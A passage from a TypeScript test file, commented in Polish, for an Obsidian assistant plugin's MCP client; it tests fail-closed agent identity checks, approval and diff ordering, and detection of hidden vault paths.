    t.is(diffCalls[0].newContent, 'pies je rybę');
});

// ─── Podgląd diffa rozpoznaje ukryte ścieżki kanonicznym isHiddenVaultPath ──
//
// Bespoke test (`path.startsWith('.') || path.includes('/.')`) nie normalizowałby `\` → `/`,
// więc ścieżka z separatorem wstecznym (`Folder\.hidden\plik.md`) NIE byłaby rozpoznana jako
// ukryta - krok 6b nigdy nie sięgałby po adapter i pokazywałby diff z pustym „starym contentem"
// zamiast realnej treści pliku. Kanoniczny `isHiddenVaultPath` (`modules/tools/vault_adapter_io.ts`)
// normalizuje separator i łapie ten przypadek.

test('ukryta ścieżka z separatorem `\\` jest rozpoznana - diff czyta PRAWDZIWY stary content z adaptera', async t => {
    const diffCalls: Array<{ oldContent: string; newContent: string }> = [];
    const agent = { name: 'Tester', permissions: { guidance_mode: true } };
    const app = {
        vault: {
            getAbstractFileByPath: () => null, // nie w indeksie Obsidiana - plik ukryty
            adapter: {
                exists: async () => true,
                read: async () => 'stara treść z .pkm-assistant',
            },
        },
    };
    const client = new MCPClient(asApp(app), asPlugin({
        agentManager: { getAgent: () => agent, getActiveAgent: () => agent },
        permissionSystem: {
            checkPermission: () => ({ allowed: true, requiresApproval: true }),
            requiresApproval: () => true,
        },
        approvalManager: { requestApproval: async () => ({ result: 'approve' }) },
    }), asRegistry({
        getTool: (name: string) => ({ name, description: name, execute: async () => ({ success: true }) }),
    }), {
        diffModalFactory: (_app: unknown, options: { oldContent: string; newContent: string }) => {
            diffCalls.push({ oldContent: options.oldContent, newContent: options.newContent });
            return { waitForApproval: async () => 'approve' };
        },
    });

    await client.executeToolCall(
        { name: 'write', arguments: { path: 'Folder\\.hidden\\plik.md', mode: 'replace', content: 'nowa treść' } },
        'Tester',
        { autonomy: 'edge' },
    );

    t.is(diffCalls.length, 1, 'ukryta ścieżka z `\\` musi trafić w gałąź adaptera i pokazać diff');
    t.is(diffCalls[0].oldContent, 'stara treść z .pkm-assistant', 'oldContent ma pochodzić z REALNEGO odczytu adaptera, nie z pustego stringa');
});

// ─── Tożsamość agenta jest fail-closed, nie podmieniana na aktywnego ───
//
// Nazwa podana explicité (`invocationAgentName`), która nie rozwiązuje się w realnego agenta,
// dostaje odmowę fail-closed — BEZ podmiany na aktywnego agenta. Brak nazwy (brak właściciela
// tury) wolno rozwiązać przez `getActiveAgent()`, ale wciąż fail-closed, gdy i to zawiedzie —
// zero ścieżki, na której `permResult` zostaje `{allowed:true}` bez sprawdzenia.

test('invocationAgentName wskazuje na agenta, którego nie ma — ODMOWA fail-closed, bez podmiany na aktywnego', async t => {
    const handlerCalls: unknown[] = [];
    const checkPermissionCalls: Array<{ agentName?: string }> = [];
    const bob = { name: 'Bob', permissions: { guidance_mode: true } };
    const client = new MCPClient(asApp(null), asPlugin({
        agentManager: {
            // "ghost" nie istnieje (np. usunięty w trakcie tury) — Bob jest AKTYWNYM agentem,
            // ale NIE jest tym, pod czyją nazwą wywołanie faktycznie przyszło.
            getAgent: (name: string) => (name === 'ghost' ? undefined : bob),
            getActiveAgent: () => bob,
        },
        permissionSystem: {
            checkPermission: (agent: { name: string }) => {
                checkPermissionCalls.push({ agentName: agent?.name });
                return { allowed: true, requiresApproval: false };
            },
            requiresApproval: () => false,
        },
    }), asRegistry({
        getTool: (name: string) => ({
            name,
            description: name,
            execute: async (args: ToolCallArgs) => { handlerCalls.push(args); return { success: true }; },
        }),
    }));

    const result = await client.executeToolCall(
        { name: 'delete', arguments: { path: 'Notatki/a.md' } }, 'ghost') as { isError?: boolean; error?: string };

    t.true(result.isError, 'agent "ghost" nie istnieje — wywołanie ma zostać odmówione, nie wykonane pod cudzą tożsamością');
    t.true(String(result.error).includes('Permission denied'), result.error);
    t.is(handlerCalls.length, 0, 'narzędzie NIE MA prawa wykonać się pod podmienioną tożsamością');
    t.false(checkPermissionCalls.some(c => c.agentName === 'Bob'),
        'bramka uprawnień nie ma prawa liczyć się na aktywnym agencie zamiast na odmowie dla "ghost"');
});

test('brak jakiegokolwiek agenta (getAgent i getActiveAgent → undefined) na narzędziu zewnętrznym — ODMOWA fail-closed', async t => {
    const handlerCalls: unknown[] = [];
    const approvalCalls: unknown[] = [];
    const client = new MCPClient(asApp(null), asPlugin({
        agentManager: { getAgent: () => undefined, getActiveAgent: () => undefined },
        externalMcpManager: {
            isExternalTool: () => true,
            getToolActionType: () => 'external.call',
        },
        permissionSystem: {
            checkPermission: () => ({ allowed: true, requiresApproval: false }),
            requiresApproval: () => false,
        },
        approvalManager: {
            requestApproval: async (req: Record<string, unknown>) => { approvalCalls.push(req); return { result: 'approve' }; },
        },
    }), asRegistry({
        getTool: (name: string) => ({
            name,
            description: name,
            source: 'user',
            serverName: 'zewnetrzny-serwer',
            execute: async (args: ToolCallArgs) => { handlerCalls.push(args); return { success: true }; },
        }),
    }));

    const result = await client.executeToolCall(
        { name: 'zewnetrzny-serwer__narzedzie', arguments: {} }, null) as { isError?: boolean; error?: string };

    t.true(result.isError, 'bez ŻADNEGO agenta narzędzie zewnętrzne nie ma prawa się wykonać');
    t.true(String(result.error).includes('Permission denied'), result.error);
    t.is(handlerCalls.length, 0, 'handler narzędzia NIE MA prawa zostać wywołany bez właściciela akcji');
    t.is(approvalCalls.length, 0, 'bez agenta nie ma komu pokazać modala zgody — fail-closed idzie PRZED approvalem, nie PRZEZ niego');
});

test.serial('executeToolCall logs onExecutionStart errors and still executes once', async t => {
    const order: string[] = [];
    const logged: Array<{ module: string; message: string; error: unknown }> = [];
    const originalError = log.error;
    const agent = { name: 'Tester', permissions: { guidance_mode: true } };
    const client = new MCPClient(asApp(null), asPlugin({
        agentManager: { getAgent: () => agent, getActiveAgent: () => agent },
        permissionSystem: {
            checkPermission: () => { order.push('permission'); return { allowed: true, requiresApproval: false }; },
            requiresApproval: () => false,
        },
    }), asRegistry({
        getTool: (name: string) => ({
            name,
            description: name,
            execute: async () => { order.push('execute'); return { success: true }; },
        }),
    }));

    let result: { success?: boolean };
    log.error = (module, message, error) => { logged.push({ module, message, error }); };
    try {
        result = await client.executeToolCall({ name: 'read', arguments: {} }, 'Tester', {
            onExecutionStart: () => { order.push('start'); throw new Error('callback failed'); },
        }) as { success?: boolean };
    } finally {
        log.error = originalError;
    }

    t.deepEqual(order, ['permission', 'start', 'execute']);
    t.true(result.success);
    t.is(logged.length, 1);
    t.is(logged[0].module, 'MCPClient');
    t.true(logged[0].message.includes('onExecutionStart'));
    t.is((logged[0].error as Error).message, 'callback failed');
});

test('executeToolCall calls onExecutionStart after queued approval and diff', async t => {
    const events: string[] = [];
    const deferred = <T>() => {
        let resolve!: (value: T) => void;
        const promise = new Promise<T>(r => { resolve = r; });
        return { promise, resolve };
    };
    const firstApprovalEntered = deferred<void>();
    const firstApproval = deferred<{ result: string }>();
    const firstDiffEntered = deferred<void>();
    const firstDiff = deferred<string>();
    let approvalCount = 0;
    let diffCount = 0;
    const agent = { name: 'Tester', permissions: { guidance_mode: true } };
    const client = new MCPClient(asApp({ vault: {
        getAbstractFileByPath: () => ({ path: 'Notatki/x.md' }),
        read: async () => 'old',
    } }), asPlugin({
        agentManager: { getAgent: () => agent, getActiveAgent: () => agent },
        permissionSystem: {
            checkPermission: () => { events.push('permission'); return { allowed: true, requiresApproval: true }; },
            requiresApproval: () => true,
        },
        approvalManager: { requestApproval: async () => {
            approvalCount++;
            events.push(`approval-${approvalCount}`);
            if (approvalCount === 1) {
                firstApprovalEntered.resolve();
                return firstApproval.promise;
            }
            return { result: 'approve' };
        } },
    }), asRegistry({
        getTool: (name: string) => ({
            name, description: name,
            execute: async () => { events.push('execute'); return { success: true }; },
        }),
    }), {
        diffModalFactory: () => ({ waitForApproval: async () => {
            diffCount++;
            events.push(`diff-${diffCount}`);
            if (diffCount === 1) {
                firstDiffEntered.resolve();
                return firstDiff.promise;
            }
            return 'approve';
        } }),
    });
    const call = { name: 'write', arguments: { path: 'Notatki/x.md', mode: 'replace', content: 'new' } };
    const opts = { origin: { agentName: 'Tester', sessionPath: 'sessions/s1.md' }, onExecutionStart: () => { events.push('start'); } };
    const first = client.executeToolCall(call, 'Tester', opts);
    const second = client.executeToolCall(call, 'Tester', opts);

    await firstApprovalEntered.promise;
    t.is(approvalCount, 1);
    t.is(diffCount, 0);
    t.false(events.includes('start'));
    t.false(events.includes('execute'));

    firstApproval.resolve({ result: 'approve' });
    await firstDiffEntered.promise;
    t.is(approvalCount, 1, 'second call stays in consent queue while first diff is pending');
    t.false(events.includes('start'));
    t.false(events.includes('execute'));

    firstDiff.resolve('approve');
    const results = await Promise.all([first, second]) as Array<{ success?: boolean }>;
    t.deepEqual(results.map(result => result.success), [true, true]);
    t.is(approvalCount, 2);
    t.is(diffCount, 2);
    t.is(events.filter(event => event === 'start').length, 2);
    t.is(events.filter(event => event === 'execute').length, 2);
    t.true(events.indexOf('permission') < events.indexOf('approval-1'));
    t.true(events.indexOf('approval-1') < events.indexOf('diff-1'));
    t.true(events.indexOf('diff-1') < events.indexOf('start'));
    t.true(events.indexOf('diff-1') < events.indexOf('approval-2'));
    t.true(events.indexOf('approval-2') < events.indexOf('diff-2'));
    t.true(events.indexOf('diff-2') < events.lastIndexOf('start'));
    t.true(events.indexOf('start') < events.indexOf('execute'));
    t.true(events.lastIndexOf('start') < events.lastIndexOf('execute'));
});

test('executeToolCall does not call onExecutionStart on permission or approval denial', async t => {
    const agent = { name: 'Tester', permissions: { guidance_mode: true } };
    let startCalls = 0;
    let executeCalls = 0;
    const makeClient = (permissionAllowed: boolean, approvalResult = 'deny') => new MCPClient(asApp(null), asPlugin({
        agentManager: { getAgent: () => agent, getActiveAgent: () => agent },
        permissionSystem: {
            checkPermission: () => ({ allowed: permissionAllowed, requiresApproval: true, reason: 'blocked' }),
            requiresApproval: () => true,
        },
        approvalManager: { requestApproval: async () => ({ result: approvalResult }) },
    }), asRegistry({
        getTool: (name: string) => ({
            name,
            description: name,
            execute: async () => { executeCalls++; return { success: true }; },
        }),
    }));

    await makeClient(false).executeToolCall({ name: 'delete', arguments: { path: 'a.md' } }, 'Tester', {
        onExecutionStart: () => { startCalls++; },
    });
    await makeClient(true).executeToolCall({ name: 'delete', arguments: { path: 'a.md' } }, 'Tester', {
        onExecutionStart: () => { startCalls++; },
    });

    t.is(startCalls, 0);
    t.is(executeCalls, 0);
    const allowed = await makeClient(true, 'approve').executeToolCall({ name: 'delete', arguments: { path: 'a.md' } }, 'Tester', {
        onExecutionStart: () => { startCalls++; },
    });
    t.deepEqual(allowed, { success: true });
    t.is(startCalls, 1);
    t.is(executeCalls, 1);
});

test('brak nazwy wywołania (brak właściciela tury) — requestApproval dostaje agentName aktywnego agenta, nie pustkę', async t => {
    const asked: Array<Record<string, unknown>> = [];
    const bob = { name: 'Bob', permissions: { guidance_mode: true } };
    const client = new MCPClient(asApp(null), asPlugin({
        agentManager: {
            // Wywołanie NIE podaje nazwy (parametr `agentName` poniżej to `null`) - brak
            // zadeklarowanego właściciela tury. `getAgent` tu odzwierciedla produkcję: agent
            // aktywny jest też zwykłym, zarejestrowanym agentem, więc odnajdywalny PO SWOJEJ
            // nazwie. Approval ma podpisać się nazwą OBIEKTU, na którym faktycznie liczono
            // bramki (`Bob`) - nie surowym, pustym parametrem wywołania.
            getAgent: (name: string) => (name === bob.name ? bob : undefined),
            getActiveAgent: () => bob,
        },
        permissionSystem: {
            checkPermission: () => ({ allowed: true, requiresApproval: true }),
            requiresApproval: () => true,
        },
        approvalManager: {
            requestApproval: async (req: Record<string, unknown>) => { asked.push(req); return { result: 'approve' }; },
        },
    }), asRegistry({
        getTool: (name: string) => ({ name, description: name, execute: async () => ({ success: true }) }),
    }));

    await client.executeToolCall({ name: 'delete', arguments: { path: 'Notatki/a.md' } }, null);

    t.is(asked.length, 1, 'agent aktywny istnieje i wymaga approvalu — modal MUSI zostać zapytany');
    t.is(asked[0].agentName, bob.name,
        'approval ma być podpisany na obiekcie agenta, na którym liczono bramki (aktywny agent), nie na pustej nazwie wywołania');
});

test('nazwa wywołania podana i zgodna z agentem (dopasowanym przez getAgent) — requestApproval dostaje agentName == agent.name', async t => {
    const asked: Array<Record<string, unknown>> = [];
    const agent = { name: 'Jaskier', permissions: { guidance_mode: true } };
    const client = new MCPClient(asApp(null), asPlugin({
        agentManager: {
            // Produkcja szuka przez `Map.get(name)` — dokładne dopasowanie, bez normalizacji
            // wielkości liter. Nazwa wywołania jest więc identyczna z `agent.name`; bramki
            // (i approval) mają liczyć się na OBIEKCIE zwróconym stąd, nie na tym stringu.
            getAgent: (name: string) => (name === agent.name ? agent : undefined),
            getActiveAgent: () => agent,
        },
        permissionSystem: {
            checkPermission: () => ({ allowed: true, requiresApproval: true }),
            requiresApproval: () => true,
        },
        approvalManager: {
            requestApproval: async (req: Record<string, unknown>) => { asked.push(req); return { result: 'approve' }; },
        },
    }), asRegistry({
        getTool: (name: string) => ({ name, description: name, execute: async () => ({ success: true }) }),
    }));

    await client.executeToolCall({ name: 'delete', arguments: { path: 'Notatki/a.md' } }, agent.name);

    t.is(asked.length, 1, 'agent istnieje i wymaga approvalu — modal MUSI zostać zapytany');
    t.is(asked[0].agentName, agent.name,
        'approval ma być podpisany na obiekcie agenta, na którym liczono bramki, nie na surowej nazwie z wywołania');
});
